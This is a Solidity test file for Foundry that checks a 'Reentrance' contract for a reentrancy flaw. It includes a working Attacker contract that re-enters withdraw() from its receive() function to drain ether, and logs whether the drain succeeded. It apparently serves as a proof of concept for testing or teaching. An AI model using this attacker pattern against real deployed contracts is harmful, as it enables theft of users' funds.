// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrance.sol";

contract ReentranceTest is Test {
    Reentrance public reentrance;
    Attacker public attacker;

    function setUp() public {
        reentrance = new Reentrance();
        attacker = new Attacker(reentrance); // Fixed: removed payable cast
    }

    function testReentrancyAttack() public {
        // Fund attacker with 1 ether for donation
        vm.deal(address(attacker), 1 ether);
        // Add extra funds to Reentrance contract
        vm.deal(address(reentrance), 1 ether);

        uint initialContractBalance = address(reentrance).balance;
        uint initialAttackerBalance = address(attacker).balance;

        // Record internal state BEFORE attack
        uint attackerInternalBalanceBefore = reentrance.balanceOf(address(attacker));
        (uint donationsTotalBefore, uint withdrawalsTotalBefore) = reentrance.getTotalActivity();
        
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("Reentrance contract ether balance:", initialContractBalance);
        console2.log("Attacker address ether balance:", initialAttackerBalance);
        console2.log("Attacker internal balance:", attackerInternalBalanceBefore);
        console2.log("Total donations:", donationsTotalBefore);
        console2.log("Total withdrawals:", withdrawalsTotalBefore);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        attacker.attack();

        uint finalContractBalance = address(reentrance).balance;
        uint finalAttackerBalance = address(attacker).balance;
        // Record internal state AFTER attack
        uint attackerInternalBalanceAfter = reentrance.balanceOf(address(attacker));
        (uint donationsTotalAfter, uint withdrawalsTotalAfter) = reentrance.getTotalActivity();

        console2.log("--- AFTER-Trigger State ---");
        console2.log("Reentrance contract ether balance:", finalContractBalance);
        console2.log("Attacker address ether balance:", finalAttackerBalance);
        console2.log("Attacker internal balance:", attackerInternalBalanceAfter);
        console2.log("Total donations:", donationsTotalAfter);
        console2.log("Total withdrawals:", withdrawalsTotalAfter);

        console2.log("--- State Change Analysis ---");
        console2.log("Contract drained:", finalContractBalance == 0 ? "YES" : "NO");
        console2.log("Attacker gained funds:", 
            finalAttackerBalance == initialAttackerBalance + initialContractBalance ? "YES" : "NO");
        console2.log("Internal balance changed:",
            attackerInternalBalanceAfter != attackerInternalBalanceBefore ? "YES" : "NO");
        console2.log("Donations changed:",
            donationsTotalAfter != donationsTotalBefore ? "YES" : "NO");
        console2.log("Withdrawals changed:",
            withdrawalsTotalAfter != withdrawalsTotalBefore ? "YES" : "NO");
        
        // Vulnerability determination
        bool contractDrained = finalContractBalance == 0;
        bool attackerProfitCorrect = finalAttackerBalance == initialAttackerBalance + initialContractBalance;
        bool vulnerabilityExists = contractDrained && attackerProfitCorrect;
        
        // Final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Reentrancy attack succeeded - contract drained and attacker gained funds");
        } else {
            console2.log("Vulnerability not Exist: Attack failed - contract not drained or profit incorrect");
        }
    }
}

contract Attacker {
    Reentrance public victim;
    uint private count;

    constructor(Reentrance _victim) {
        victim = _victim;
    }

    function attack() external payable {
        // Donate to establish balance
        victim.donate{value: 1 ether}(address(this));
        // Trigger initial withdrawal
        victim.withdraw(1 ether);
    }

    receive() external payable {
        if (count == 0) {
            count++;
            // Reenter during withdrawal
            victim.withdraw(1 ether);
        }
    }
}